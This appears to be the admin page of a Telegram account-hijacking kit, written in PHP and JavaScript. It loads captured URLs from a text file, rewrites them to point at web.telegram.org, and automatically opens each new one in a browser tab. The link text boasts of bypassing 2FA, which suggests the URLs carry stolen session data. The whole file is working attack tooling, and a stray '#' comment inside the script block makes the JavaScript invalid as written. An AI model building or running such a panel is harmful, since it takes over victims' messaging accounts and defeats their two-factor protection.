<?php
if (isset($_GET['ajax']) && $_GET['ajax'] === '1') {
    $file = 'urls.txt';
    if (file_exists($file)) {
        $lines = file($file, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
        header('Content-Type: application/json');
        echo json_encode($lines);
    } else {
        echo json_encode([]);
    }
    exit;
}
?>
<!DOCTYPE html>
<html lang="vi">
<head>
    <meta charset="UTF-8">
    <style>
        table { border-collapse: collapse; width: 100%; }
        th, td { border: 1px solid #ccc; padding: 8px; text-align: left; }
        .url-col { width: 60%; word-break: break-all; }
        .view-col { width: 40%; }
    </style>
</head>
<body>
    <h2>List tele ._. bugineverything</h2>
    <div id="urlTable">...</div>

<script>
# code by bugineverything
    let lastUrls = [];

    function loadTable() {
        fetch('admin.php?ajax=1')
            .then(response => response.json())
            .then(urls => {
                if (JSON.stringify(urls) !== JSON.stringify(lastUrls)) {
                    const newUrls = urls.filter(url => !lastUrls.includes(url));
                    lastUrls = urls;

                    const tableHtml = buildTable(urls);
                    document.getElementById('urlTable').innerHTML = tableHtml;

                    // Mở tab mới cho mỗi URL mới
                    for (const url of newUrls) {
                        try {
                            const u = new URL(url);
                            u.protocol = "https:";
                            u.host = "web.telegram.org";
                            window.open(u.toString(), '_blank');
                        } catch (e) {
                            // Nếu URL không hợp lệ thì bỏ qua
                        }
                    }
                }
            });
    }

    function buildTable(urls) {
        let html = '<table><tr><th class="url-col">URL</th><th class="view-col">Truy cập</th></tr>';
        for (const url of urls) {
            let newUrl;
            try {
                const u = new URL(url);
                u.protocol = "https:";
                u.host = "web.telegram.org";
                newUrl = u.toString();
            } catch(e) {
                newUrl = url;
            }

            const safeUrl = escapeHtml(url);
            const safeNewUrl = escapeHtml(newUrl);

            html += `<tr><td>${safeNewUrl}</td><td><a href="${safeNewUrl}" target="_blank">Access telegram byP3ss 2Fa;))</a></td></tr>`;
        }
        html += '</table>';
        return html;
    }

    function escapeHtml(text) {
        const div = document.createElement('div');
        div.innerText = text;
        return div.innerHTML;
    }

    setInterval(loadTable, 1000);
    loadTable();
</script>

</body>
</html>
